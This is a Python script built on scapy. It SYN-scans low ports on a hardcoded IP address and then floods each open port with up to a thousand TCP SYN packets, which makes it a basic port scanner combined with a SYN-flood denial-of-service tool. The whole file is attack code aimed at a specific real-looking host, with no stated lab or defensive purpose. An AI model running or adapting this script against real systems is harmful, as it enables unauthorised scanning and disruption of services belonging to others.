import sys
import time
from scapy.all import Ether, IP, TCP, sendp, sr1
import random

TARGET_IP = "129.21.72.179"
INTERFACE = "Wi-Fi"
NUM_PACKETS = 1000
DURATION = 1
PORTS_TO_SCAN = range(1,10)

open_ports = []

def scan_port(ip,port):
    packet = IP(dst=ip) / TCP(dport=port, flags="S")
    try:
        response = sr1(packet, timeout=1, verbose=0)
    except Exception as e:
        print(f"Error scanning port {port}")
        return

    if response is None:
        return False
    elif response.haslayer(TCP):
        tcp_layer = response.getlayer(TCP)
        if tcp_layer.flags == 0x12:
            reset_packet = IP(dst=ip) / TCP(dport=port, flags="R")
            sr1(reset_packet, timeout=1, verbose=0)
            return True
        elif tcp_layer.flags == 0x14:
            return False
    
    return False

def send_packets(target_ip, interface, num_packets, duration, open_port):
    end_time = time.time() + duration
    packet_count = 0

    while time.time() < end_time and packet_count < num_packets:
        packet = Ether() / IP(dst=target_ip) / TCP(dport=open_port, flags="S")
        sendp(packet, iface=interface)
        print(f"Port = {open_port}")
        packet_count += 1

def check_port(ip, port):
    packet = IP(dst=ip) / TCP(dport=port, flags="S")
    response = sr1(packet, timeout=1, verbose=0)

    if response and response.haslayer(TCP):
        if response[TCP].flags == 0x12:
            print(f"Port {port} is OPEN on {ip}")
        elif response[TCP].flags == 0x14:
            print(f"Port {port} is CLOSED on {ip}")
    else:
        print(f"No response from {ip} on port {port} (filtered or down)")

def main():
    check_port(TARGET_IP, 80)

    print("Scanning for open ports...")
    for port in PORTS_TO_SCAN:
        if scan_port(TARGET_IP, port):
            print(f"Port {port} is OPEN")
            open_ports.append(port)
        else:
            print(f"Port {port} is CLOSED")

    for open_port in open_ports:
        send_packets(TARGET_IP, INTERFACE, NUM_PACKETS, DURATION, open_port)

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        print("This script requires Python 3.")
        sys.exit(1)

    main()
